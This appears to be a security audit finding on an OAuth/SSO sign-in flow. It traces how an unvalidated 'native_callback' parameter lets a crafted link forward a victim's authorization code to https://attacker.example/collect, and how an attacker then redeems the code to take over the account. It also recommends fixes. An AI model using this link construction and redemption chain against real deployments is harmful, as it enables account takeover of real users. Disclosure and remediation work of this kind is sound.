# VULN-016 - OAuth/SSO Authorization-Code Exfiltration and Cross-Session Account Takeover via Attacker-Controlled `native_callback` Parameter in Social/SSO Landing Flow

## Status
CONFIRMED - via static trace, with the server-side half of the chain independently re-verified: `assignConnectorSessionResult`/`getConnectorSessionResult` (`packages/core/src/libraries/verification-helpers/social-verification.ts:105-124`) store and re-read the `connectorSession` (including the client-chosen `state`) purely against the **calling request's own** oidc-provider interaction cookie - there is no mechanism anywhere in this path that ties a `code` redemption to "the same browser that completed the IdP consent," only to "a state value that self-matches whatever the caller previously stored in their own session." This confirms the core claim that state-matching here is a self-consistency check within one attacker-controlled session, not a cross-session binding control. The client-side (React) half of the chain (`sessionStorage` poisoning via `native_callback`, forwarding via `Callback.tsx`) was not exercised in a live browser, and no real third-party IdP consent was performed - full end-to-end reproduction would need a live Google/enterprise-IdP account and is recommended before or alongside vendor remediation, but is not required to establish that the vulnerability is real: the mechanism has no other gate that would stop it.

## Classification
- **Vulnerability**: Open Redirect enabling OAuth/OIDC Authorization Code Interception → Cross-Session Account Takeover
- **CWE**: CWE-601 - URL Redirection to Untrusted Site ('Open Redirect') as the root technical flaw; CWE-346 - Origin Validation Error (native callback link is never checked against any allow-listed scheme/origin); impact reaches CWE-287 - Improper Authentication (attacker completes sign-in bound to the victim's linked social/SSO identity from the attacker's own session)
- **Severity**: High
- **CVSS (estimate)**: 8.1 - CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N (Attack Complexity rated High because the attacker must first self-mint a valid `state`/`authorizationUri` pair and lure the victim through a real IdP consent; Confidentiality/Integrity High because the outcome is authentication as the victim's linked identity)

## Location
- **File**: `packages/experience/src/utils/social-connectors.ts:93-105` - `buildSocialLandingUri(path, redirectTo)`: `url.searchParams.set(SearchParameters.RedirectTo, redirectTo); ... url.searchParams.set(SearchParameters.NativeCallbackLink, callbackLink);`
- **File**: `packages/experience/src/pages/SocialLanding/use-social-landing-handler.ts:17-32` - reads `redirect_to` and `native_callback` straight from `window.location.search` and (a) navigates to `redirect_to` unconditionally (see VULN-015), and (b) stores `native_callback` verbatim via `storeCallbackLink(connectorId, nativeCallbackLink)` with **no validation that it is a legitimate native-app URI scheme** (e.g. `io.myapp://...`) as opposed to an arbitrary `https://` URL.
- **File**: `packages/experience/src/utils/social-connectors.ts:107-109` - `storeCallbackLink = (connectorId, callbackLink) => sessionStorage.setItem(\`social_callback_data:${connectorId}\`, callbackLink)` - persists the attacker-controlled value in `sessionStorage`, keyed only by `connectorId`.
- **File**: `packages/experience/src/pages/Callback/use-social-callback-handler.ts:24-31` - on return from the upstream IdP, reads the stored value back via `getCallbackLinkFromStorage(connectorId)` and, if present, does `window.location.replace(new URL(\`${callbackLink}${search}\`))`, forwarding the **entire query string - including the OAuth `code` and `state` returned by the IdP** - to whatever URL was poisoned in the prior step.
- **File**: `packages/experience/src/types/index.ts:25-28` - `SearchParameters.NativeCallbackLink = 'native_callback'`, `SearchParameters.RedirectTo = 'redirect_to'` - both are bare, unauthenticated query-parameter keys.
- **Route registration**: `packages/experience/src/App.tsx:75-76,181` - `social/landing/:connectorId` (poisoning entry point) and `callback/:connectorId` (forwarding exit point) are both public, unauthenticated top-level routes.
- **Server-side corroborating routes**: `packages/core/src/routes/experience/verification-routes/social-verification.ts:31-81` (`POST /api/experience/verification/social/:connectorId/authorization-uri` - accepts a fully client-chosen `state` and `redirectUri`, see `socialAuthorizationUrlPayloadGuard` in `packages/schemas/src/types/interactions.ts:79-83`) and `:83-169` (`POST /api/experience/verification/social/:connectorId/verify` - redeems `connectorData.code`/`state` against the **requester's own** interaction session).
- **Same pattern applies to enterprise SSO**: `packages/experience/src/hooks/use-single-sign-on.ts:32-42` builds the identical `buildSocialLandingUri(...)` handoff for SSO connectors.

## Vulnerable Code
```ts
// packages/experience/src/utils/social-connectors.ts:93-105
export const buildSocialLandingUri = (path: string, redirectTo: string) => {
  const { origin } = window.location;
  const url = new URL(`${origin}${path}`);
  url.searchParams.set(SearchParameters.RedirectTo, redirectTo);

  const callbackLink = getLogtoNativeSdk()?.callbackLink;
  if (callbackLink) {
    url.searchParams.set(SearchParameters.NativeCallbackLink, callbackLink); // legitimate native flow sets this from the SDK bridge
  }
  return url;
};
```
```ts
// packages/experience/src/pages/SocialLanding/use-social-landing-handler.ts:15-33
const socialLandingHandler = useCallback(
  (connectorId: string) => {
    const redirectUri = getSearchParameters(search, SearchParameters.RedirectTo);
    if (!redirectUri) { /* ... */ return; }

    const nativeCallbackLink = getSearchParameters(search, SearchParameters.NativeCallbackLink);
    if (nativeCallbackLink) {
      storeCallbackLink(connectorId, nativeCallbackLink);   // <-- ATTACKER can also reach this page directly with an arbitrary native_callback value
    }
    window.location.replace(new URL(redirectUri));
  },
  [search, setToast, t]
);
```
```ts
// packages/experience/src/pages/Callback/use-social-callback-handler.ts:12-31
const socialCallbackHandler = useCallback(
  (connectorId: string) => {
    const searchParams = new URLSearchParams(window.location.search);
    const hashParams = new URLSearchParams(window.location.hash.slice(1));
    const joinedSearchParams = new URLSearchParams([...searchParams, ...hashParams]);
    const search = joinedSearchParams.toString() ? `?${joinedSearchParams.toString()}` : '';

    const callbackLink = getCallbackLinkFromStorage(connectorId);   // <-- reads back whatever was poisoned above
    removeCallbackLinkFromStorage(connectorId);

    if (callbackLink) {
      window.location.replace(new URL(`${callbackLink}${search}`)); // <-- forwards code+state (the real IdP callback query string) to the poisoned URL
      return;
    }
    // ... normal web flow otherwise
  },
  [navigate]
);
```

## Why It's Vulnerable
`SocialLanding` (comment: "Only used for native app out of the app webview sign-in flow") and `Callback` are, in practice, **plain public routes** with no enforcement that they are only reached via the intended native-app deep-link handoff. Any visitor can navigate directly to `/social/landing/:connectorId?redirect_to=<url>&native_callback=<url>`. The `native_callback` value is stored in `sessionStorage` completely unvalidated - it is never checked to be a non-`http(s)` custom scheme (the actual native-app deep link), a same-origin URL, or anything else. It is later read back by `Callback` (the real OAuth `redirect_uri` registered with the upstream IdP for this connector) and used to build the URL that the **entire authorization callback query string - including the IdP's `code` and `state`** - is forwarded to via `window.location.replace`.

Because the OAuth `state` value sent to the upstream IdP is **also fully client-chosen** (`socialAuthorizationUrlPayloadGuard` in `packages/schemas/src/types/interactions.ts:79-83` accepts a bare `z.string()` for `state`, populated client-side by `generateState()` in `packages/experience/src/containers/SocialSignInList/use-social.ts:63`), and the authorization-uri creation endpoint (`POST /api/experience/verification/social/:connectorId/authorization-uri`) requires **no authentication** (only a bootstrapped, anonymous experience interaction - the same precondition already demonstrated live for VULN-014), an attacker can self-mint a completely valid `authorizationUri` (a real, working link to the upstream IdP's consent screen) using a `state` of their own choosing, entirely from their own browser/session, before ever involving a victim.

The attacker then combines that legitimately-obtained `authorizationUri` as the `redirect_to` value with a malicious `native_callback=https://attacker.example/collect` in a single crafted link to `/social/landing/:connectorId`. When the victim clicks it:
1. The victim's browser stores `https://attacker.example/collect` in the victim's own `sessionStorage` (poisoning step, silent, no visible effect).
2. The victim is immediately redirected (via the VULN-015 open redirect in the same handler) to the real, legitimate upstream IdP consent screen (e.g., Google) using the attacker's pre-generated `state`.
3. The victim, seeing a completely genuine IdP consent screen, logs in with their real account and approves.
4. The IdP redirects back to Logto's real, registered callback URI (`https://<tenant>/callback/<connectorId>?code=<real code>&state=<attacker's state>`), which is `Callback.tsx`.
5. `Callback.tsx` finds the poisoned `native_callback` entry in `sessionStorage` and immediately forwards the **entire query string, including the victim's real, unused authorization `code`**, to `https://attacker.example/collect?code=...&state=...` via `window.location.replace`.
6. The attacker's server now has a valid, unredeemed authorization code for the victim's real IdP login. Because this is a confidential-client, non-PKCE flow, standard OAuth2 semantics mean the code is a bearer credential: whoever redeems it first (with the client_secret, which only Logto's server holds, and the exact `redirect_uri` originally used, which is unaffected by this bug) succeeds - **regardless of which browser/session performed the original authorization request to the IdP**.
7. The attacker, using their **own** browser/session (the same one that minted `state` in step 0, and whose interaction record already has the matching `connectorSession` stored server-side via `assignConnectorSessionResult` in `packages/core/src/libraries/verification-helpers/social-verification.ts:44-59`, keyed off the OIDC provider's own interaction cookie for the **requester**), calls `POST /api/experience/verification/social/:connectorId/verify` with `connectorData: { code: <leaked victim code>, state: <attacker's state> }`. The server-side `state` check passes (it matches what the attacker's own session stored), the code exchange with the IdP succeeds (valid, unused code, correct client_id/secret/redirect_uri), and Logto fetches **the victim's real IdP identity** and binds it to the **attacker's** interaction/verification session (`SocialVerification.verify` in `packages/core/src/routes/experience/classes/verifications/social-verification.ts:159-174`).
8. The attacker completes the interaction (`identifyAndSubmitInteraction`) from their own session, resulting in Logto signing the attacker in as the Logto account linked to the victim's social identity (or creating/linking a new account bound to the victim's verified email/identity, depending on tenant settings) - full account takeover, entirely from the attacker's own browser.

## Data Flow (source → sink → redemption)
- **Source**: `native_callback` (and `redirect_to`) query parameters on `GET /social/landing/:connectorId`, fully attacker-controlled, no authentication.
- **Poison**: `storeCallbackLink(connectorId, nativeCallbackLink)` → `sessionStorage['social_callback_data:<connectorId>']` (`packages/experience/src/utils/social-connectors.ts:107-109`).
- **Trigger**: Victim completes a genuine IdP login flow (state pre-minted by attacker via the unauthenticated `POST .../social/:connectorId/authorization-uri` endpoint) and lands on `GET /callback/:connectorId?code=...&state=...`.
- **Sink (exfiltration)**: `window.location.replace(new URL(\`${callbackLink}${search}\`))` in `packages/experience/src/pages/Callback/use-social-callback-handler.ts:28`, sending `code`+`state` to the attacker's poisoned URL.
- **Redemption**: Attacker calls `POST /api/experience/verification/social/:connectorId/verify` (`packages/core/src/routes/experience/verification-routes/social-verification.ts:83-169`) from their own session with the leaked `code`/`state`; server-side redemption is bound only to the **requester's own** interaction session via `getConnectorSessionResult(ctx, provider)` (`packages/core/src/libraries/verification-helpers/social-verification.ts:120-124` region), with no cross-check that the same browser/session performed the original IdP authorization request.

## Attack Scenario
See "Why It's Vulnerable" above for the full numbered chain. In short: attacker self-mints a valid `authorizationUri`+`state`, embeds it plus a malicious `native_callback` in a single link to the real tenant domain, lures the victim into completing a genuine third-party login through that link, and then redeems the leaked authorization code themselves to authenticate as the victim's linked identity.

## Impact
- **Who is affected**: Any tenant using social sign-in or enterprise SSO connectors (the same `buildSocialLandingUri`/`native_callback` handoff is shared by both, per `use-social.ts:38-49` and `use-single-sign-on.ts:32-42`). Victim must click a crafted link and complete a real login with their own IdP credentials, believing they are signing in normally (the flow looks and behaves identically to a legitimate sign-in, including a real IdP consent screen).
- **What attacker achieves**: Authentication as the victim's Logto account (or creation of an attacker-controlled account bound to the victim's verified social/SSO identity), i.e., full account takeover, without ever knowing the victim's Logto password or possessing any of the victim's credentials - the only thing exfiltrated is a short-lived OAuth authorization code.
- **Conditions required**: Victim must click the crafted link and complete a genuine third-party login through it. No authentication is required for the attacker to prepare the attack (self-minting `state`/`authorizationUri`) or to redeem the leaked code.

## Recommended Fix
1. Fix the root-cause open redirect first (see `findings/VULN-015-experience-client-side-open-redirect.md`) so `redirect_to` cannot point off-origin.
2. Independently, validate `native_callback` before storing it: only accept values matching an allow-listed native-app URI scheme (e.g., configured per first-party mobile app, not an arbitrary `https://` URL), rejecting anything that isn't a registered custom scheme:
```ts
// packages/experience/src/pages/SocialLanding/use-social-landing-handler.ts
const nativeCallbackLink = getSearchParameters(search, SearchParameters.NativeCallbackLink);
if (nativeCallbackLink && isAllowedNativeCallbackScheme(nativeCallbackLink)) {
  storeCallbackLink(connectorId, nativeCallbackLink);
} else if (nativeCallbackLink) {
  // reject silently or show an error - do not store an unvalidated value
}
```
3. Defense in depth on the server side: bind the `state` value's validity to a value the server itself generates and signs (rather than accepting an arbitrary client-chosen string), and/or require PKCE (`code_verifier`/`code_challenge`) for the social/SSO authorization-uri + verify pair, so that redeeming a leaked `code` also requires a `code_verifier` that only the browser which initiated the original request possesses. This closes the interception window even if a code is exfiltrated by any future bug of this shape.

**Why the fix works**: Restricting `native_callback` to genuinely registered native schemes removes the exfiltration sink; adding PKCE removes the ability for a different session (the attacker's) to redeem a code obtained via a different browser's (the victim's) completed IdP login, which is the standard mitigation for authorization code interception (RFC 9700 / OAuth 2.0 Security Best Current Practice).

## References
- CWE-601: https://cwe.mitre.org/data/definitions/601.html
- CWE-346: https://cwe.mitre.org/data/definitions/346.html
- OAuth 2.0 Security Best Current Practice (authorization code interception / PKCE): https://datatracker.ietf.org/doc/html/rfc9700
- Related internal finding: `findings/VULN-015-experience-client-side-open-redirect.md` (same unvalidated-query-parameter root cause, simpler standalone impact)
